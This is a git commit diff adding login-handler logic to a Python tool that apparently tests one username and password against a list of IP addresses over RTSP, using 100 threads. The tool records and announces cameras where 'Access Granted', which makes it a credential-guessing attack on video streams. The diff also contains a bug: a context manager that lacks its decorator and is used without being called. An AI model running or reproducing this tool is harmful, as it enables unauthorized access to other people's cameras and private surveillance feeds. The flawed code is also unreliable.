50b331d58e2935d43effdf7b6ceeef624d90a1d4
Gill-Singh-A <amansg22@iitk.ac.in>
2024-02-26 05:17:58 +0530

    Implemented Login Handler Logic

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 #! /usr/bin/env python3
 
-import cv2
+import cv2, contextlib, io, sys
 from datetime import date
 from urllib.parse import quote
 from threading import Thread, Lock
@@ -30,16 +30,35 @@ lock = Lock()
 threads = 100
 verbose = False
 
+successful_logins = []
+
+def stdout_nil():
+    original_stdout = sys.stdout
+    sys.stdout = io.StringIO()
+    try:
+        yield
+    finally:
+        sys.stdout = original_stdout
+
 def loginRTSP(ip, user, password):
     try:
-        video_capture = cv2.VideoCapture(f"rtsp://{user}:{password}@{ip}")
-        ret, frame = video_capture.read()
-        if ret:
+        with stdout_nil:
+            video_capture = cv2.VideoCapture(f"rtsp://{user}:{password}@{ip}")
+        if video_capture.isOpened():
             return True
         else:
             return False
     except:
         return False
+def loginHandler(ips, user, password, verbose=False):
+    global successful_logins
+    for ip in ips:
+        login_status = loginRTSP(ip, user, password)
+        if login_status:
+            with lock:
+                successful_logins.append(ip)
+                if verbose:
+                    display('+', f"{Back.MAGENTA}{ip}{Back.RESET} => Access Granted\tAccess Gained = {Back.MAGENTA}{len(successful_logins)}{Back.RESET}")
 
 if __name__ == "__main__":
     arguments = get_arguments(('-i', "--ip", "ip", "File Name of List of IP Addresses (Seperated by ',')"),
